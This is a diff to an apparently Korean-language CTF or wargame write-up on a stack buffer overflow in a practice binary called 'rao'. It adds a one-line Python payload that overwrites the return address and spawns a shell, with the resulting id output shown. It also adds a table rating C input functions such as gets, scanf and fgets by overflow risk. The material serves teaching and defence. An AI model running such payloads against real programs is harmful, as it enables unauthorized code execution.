@@ -158,7 +158,12 @@ $ id
     b'uid=1000(foo1) gid=1000(foo1) groups=1000(foo1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare),138(docker)\n'
 uid=1000(foo1) gid=1000(foo1) groups=1000(foo1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare),138(docker)
 $  
+```
 
+
+아래와 같이 파이썬에서 모듈을 불러와 해결할 수도 있음
+```sh
+$ (python -c "import sys;sys.stdout.buffer.write(b'A'*0x30 + b'B'*0x8 + b'\xaa\x06\x40\x00\x00\x00\x00\x00')";cat)| ./rao$ ididuid=1000(rao) gid=1000(rao) groups=1000(rao)
 ```
 
 
@@ -215,3 +220,12 @@ b'success'
 - [ ] Buffer Overflow 식별
 - [ ] 반환 주소 확인
 - [ ] 쉘코드 실행
+
+
+# 패치
+|**입력 함수(패턴)**|**위험도**|**평가 근거**|
+|---|---|---|
+|gets(buf)|매우 위험|- 입력받는 길이에 제한이 없음.<br>    <br>- 버퍼의 널 종결을 보장하지 않음: 입력의 끝에 널바이트를 삽입하므로, 버퍼를 꽉채우면 널바이트로 종결되지 않음. 이후 문자열 관련 함수를 사용할 때 버그가 발생하기 쉬움.|
+|scanf(“%s”, buf)|매우 위험|- 입력받는 길이에 제한이 없음.<br>    <br>- 버퍼의 널 종결을 보장하지 않음: `gets`와 동일.|
+|scanf(“%[width]s”, buf)|주의 필요|- width만큼만 입력받음: width를 설정할 때 `width <= size(buf) - 1`을 만족하지 않으면, 오버플로우가 발생할 수 있음.<br>    <br>- 버퍼의 널 종결을 보장하지 않음: `gets`와 동일.|
+|fgets(buf, len, stream)|주의 필요|- len만큼만 입력받음: len을 설정할 때 `len <= size(buf)`을 만족하지 않으면, 오버플로우가 발생할 수 있음.<br>    <br>- 버퍼의 널 종결을 보장함.<br>    <br>    - len보다 적게 입력하면, 입력의 끝에 널바이트 삽입.<br>        <br>    - len만큼 입력하면, 입력의 마지막 바이트를 버리고 널바이트 삽입.<br>        <br>- **데이터 유실 주의**: 버퍼에 담아야 할 데이터가 30바이트인데, 버퍼의 크기와 len을 30으로 작성하면, 29바이트만 저장되고, 마지막 바이트는 유실됨.|
